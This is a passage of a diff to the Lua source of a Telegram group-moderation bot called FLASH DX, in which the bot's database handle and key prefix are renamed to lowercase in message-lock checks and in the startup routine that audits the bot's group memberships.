+if flashdx1:get(flash..'bot:webpage:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end
 if text:match("@") then
-if FLASHdx1:get(FLASH..'tags:lock'..result.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end
 if text:match("#") then 
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..result.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end
 if text:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..result.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end
 if text:match("[A-Z]") or text:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..result.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end end end
 getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  
 print('\27[30;32m»» جاري فحص الجروبات الوهميه ««\n\27[1;37m')
-local list = FLASHdx1:smembers(FLASH..'bot:userss')  
+local list = flashdx1:smembers(flash..'bot:userss')  
 for k,v in pairs(list) do
 getchat(v,function(arg,data)
 end) end
-local list = FLASHdx1:smembers(FLASH..'bot:groups') 
+local list = flashdx1:smembers(flash..'bot:groups') 
 for k,v in pairs(list) do 
 getchat(v,function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
 print('\27[30;32m»» البوت عضو في المجموعه\nتم مغادرة المجموعه \n\27[1;37m')
-FLASHdx1:srem(FLASH..'bot:groups',v)  
+flashdx1:srem(flash..'bot:groups',v)  
 remgroup(v)   
 changeChatMemberStatus(v, bot_id, "Left")
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-FLASHdx1:srem(FLASH..'bot:groups',v)  
+flashdx1:srem(flash..'bot:groups',v)  
 remgroup(v)   
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
 print('\27[30;32m»» البوت مطرود في المجموعه\nتم مسح بيانات المجموعه \n\27[1;37m')
-FLASHdx1:srem(FLASH..'bot:groups',v)  
+flashdx1:srem(flash..'bot:groups',v)  
 remgroup(v)   
 end
 if data and data.code_ and data.code_ == 400 then
-FLASHdx1:srem(FLASH..'bot:groups',v)  
+flashdx1:srem(flash..'bot:groups',v)  
 remgroup(v)   
 end 
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
-FLASHdx1:sadd(FLASH..'bot:groups',v)
+flashdx1:sadd(flash..'bot:groups',v)
 print('\27[30;32m»» البوت ادمن في المجموعه \n\27[1;37m')
 addgroup(v)
 end end) end end end
 -------------------------******* The Best Source *******-------------------------
--- END VERSION (24) FLASH DX 
--- All The File By Developer FLASH : @Q_Y_4
+-- END VERSION (24) flash DX 
+-- All The File By Developer flash : @Q_Y_4
 -- Join In Chennel Source : @FAQY4 
--- Join In Explanation Channel : @Learn_FLASH
+-- Join In Explanation Channel : @Learn_flash
